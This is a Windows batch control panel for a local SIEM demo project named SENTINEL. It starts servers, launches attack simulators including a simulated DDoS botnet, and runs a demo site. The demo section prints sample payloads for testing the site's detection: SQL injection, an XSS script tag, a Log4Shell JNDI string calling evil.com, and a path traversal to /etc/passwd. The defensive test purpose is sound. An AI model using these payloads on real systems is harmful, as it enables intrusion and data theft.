@echo off
title SENTINEL SIEM - Control Panel
color 0B
cls

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERROR] Python not found. Run setup.bat first.
    pause & exit /b 1
)
python -c "import flask" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERROR] Flask not installed. Run setup.bat first.
    pause & exit /b 1
)

:MENU
cls
color 0B
echo.
echo  ============================================================
echo    SENTINEL SIEM  ^|  Control Panel
echo    Engineered by Abhay Singh Taknet
echo  ============================================================
echo.
echo    [1]  Start SENTINEL SIEM System
echo    [2]  Launch Attack Simulator
echo    [3]  Launch Demo Website  ^(port 5050^)
echo    [4]  Stop All  ^(close everything^)
echo    [5]  Exit
echo.
echo  ============================================================
echo.
set /p CHOICE=   Select option (1/2/3/4/5): 

if "%CHOICE%"=="1" goto START_SYSTEM
if "%CHOICE%"=="2" goto ATTACK_MENU
if "%CHOICE%"=="3" goto DEMO_SITE
if "%CHOICE%"=="4" goto STOP_ALL
if "%CHOICE%"=="5" exit
goto MENU

:: ════════════════════════════════════════════
:START_SYSTEM
cls & color 0A
echo.
echo  Starting SENTINEL SIEM...
echo.
if not exist "logs"  mkdir logs
if not exist "db"    mkdir db
if not exist "logs\banned_ips.json" echo {} > logs\banned_ips.json

echo  [1/3] Starting Main Server on port 5000...
start "SENTINEL_MAIN" cmd /k "color 0A && title SENTINEL SIEM - Main Server && python app.py"
timeout /t 3 /nobreak >nul

echo  [2/3] Starting Client Portal on port 5001...
if exist "Client_Portal\portal_app.py" (
    start "SENTINEL_PORTAL" cmd /k "color 0E && title SENTINEL - Client Portal && cd Client_Portal && python portal_app.py"
    timeout /t 2 /nobreak >nul
)

echo  [3/3] Opening dashboard in browser...
timeout /t 2 /nobreak >nul
start http://localhost:5000

echo.
echo  ============================================================
echo    SENTINEL IS RUNNING
echo    Dashboard     ->  http://localhost:5000
echo    Client Portal ->  http://localhost:5001
echo  ============================================================
echo.
echo  Press any key to return to menu...
pause >nul
goto MENU

:: ════════════════════════════════════════════
:ATTACK_MENU
cls & color 0C
echo.
echo  ============================================================
echo    ATTACK SIMULATOR  ^|  Select Attack Type
echo  ============================================================
echo.
echo    [1]  SQL Injection + XSS + Honeypot Attacks
echo    [2]  Mass DDoS Botnet Simulation (30 threads)
echo    [3]  Safe Traffic Generator (clean normal traffic)
echo    [4]  Back to Main Menu
echo.
echo  NOTE: Start SENTINEL first (Option 1) before launching attacks.
echo.
set /p ATKCHOICE=   Select (1/2/3/4): 

if "%ATKCHOICE%"=="1" goto ATK_INJECTION
if "%ATKCHOICE%"=="2" goto ATK_MASS
if "%ATKCHOICE%"=="3" goto ATK_SAFE
if "%ATKCHOICE%"=="4" goto MENU
goto ATTACK_MENU

:ATK_INJECTION
start "SENTINEL_ATK1" cmd /k "color 0C && title RED-TEAM: Injection Attacks && python attacks/injection_tool.py"
timeout /t 1 /nobreak >nul
echo  Injection simulator launched. Press any key to return...
pause >nul
goto MENU

:ATK_MASS
start "SENTINEL_ATK2" cmd /k "color 0C && title MASS ATTACK: DDoS Botnet && python attacks/mass_attacker.py"
timeout /t 1 /nobreak >nul
echo  Mass attack launched. Press any key to return...
pause >nul
goto MENU

:ATK_SAFE
start "SENTINEL_ATK3" cmd /k "color 0A && title Safe Traffic Generator && python attacks/safe_traffic_gen.py && pause"
timeout /t 1 /nobreak >nul
echo  Safe traffic generator launched. Press any key to return...
pause >nul
goto MENU

:: ════════════════════════════════════════════
:DEMO_SITE
cls & color 09
echo.
echo  ============================================================
echo    DEMO WEBSITE  ^|  Launching on port 5050
echo  ============================================================
echo.

if not exist "integration\example_site\site_app.py" (
    echo  [ERROR] Demo site not found.
    echo  Expected: integration\example_site\site_app.py
    echo.
    pause
    goto MENU
)

echo  Starting Demo Website on http://localhost:5050
echo  Make sure SENTINEL is running on port 5000 first.
echo.

start "SENTINEL_DEMO" cmd /k "color 09 && title DEMO WEBSITE - port 5050 && cd integration\example_site && python site_app.py"
timeout /t 3 /nobreak >nul

echo  Opening demo site in browser...
start http://localhost:5050

echo.
echo  ============================================================
echo    DEMO SITE IS RUNNING
echo.
echo    Demo Website  ->  http://localhost:5050
echo    SENTINEL      ->  http://localhost:5000
echo.
echo    Try these attacks in the login form on the demo site:
echo      SQL Injection : admin' OR '1'='1
echo      XSS Attack    : ^<script^>alert(1)^</script^>
echo      Log4Shell     : $^{jndi:ldap://evil.com/a^}
echo      Path Traversal: ../../../../etc/passwd
echo.
echo    Watch SENTINEL dashboard react in real-time!
echo  ============================================================
echo.
echo  Press any key to return to menu...
pause >nul
goto MENU

:: ════════════════════════════════════════════
:STOP_ALL
cls & color 0C
echo.
echo  ============================================================
echo    STOPPING ALL SENTINEL PROCESSES
echo  ============================================================
echo.

echo  [1/4] Killing all Python processes...
taskkill /F /IM python.exe  /T >nul 2>&1
taskkill /F /IM python3.exe /T >nul 2>&1
taskkill /F /IM pythonw.exe /T >nul 2>&1
echo  [OK] Python processes terminated.

echo  [2/4] Closing SENTINEL browser tab...
PowerShell -NoProfile -Command "Add-Type -AssemblyName Microsoft.VisualBasic; Add-Type -AssemblyName System.Windows.Forms; $proc = Get-Process | Where-Object { $_.MainWindowTitle -like '*SENTINEL*' -or $_.MainWindowTitle -like '*localhost:5000*' -or $_.MainWindowTitle -like '*localhost:5001*' -or $_.MainWindowTitle -like '*localhost:5050*' } | Select-Object -First 1; if ($proc) { [Microsoft.VisualBasic.Interaction]::AppActivate($proc.Id); Start-Sleep -Milliseconds 300; [System.Windows.Forms.SendKeys]::SendWait('^^w') }" >nul 2>&1
echo  [OK] Browser tab closed.

echo  [3/4] Closing all terminal windows...
PowerShell -NoProfile -Command "Get-Process cmd,conhost | Where-Object { $_.MainWindowTitle -match 'SENTINEL|RED-TEAM|MASS ATTACK|Safe Traffic|Client Portal|Injection|DDoS|Botnet|DEMO WEBSITE' } | Stop-Process -Force -ErrorAction SilentlyContinue" >nul 2>&1
echo  [OK] Terminal windows closed.

echo  [4/4] Releasing ports 5000, 5001 and 5050...
PowerShell -NoProfile -Command "@(5000,5001,5050) | ForEach-Object { $c = Get-NetTCPConnection -LocalPort $_ -ErrorAction SilentlyContinue; if ($c) { Stop-Process -Id $c.OwningProcess -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
echo  [OK] Ports released.

echo.
echo  ============================================================
echo    ALL STOPPED. Nothing running in background.
echo  ============================================================
echo.
echo  Press any key to return to menu...
pause >nul
goto MENU
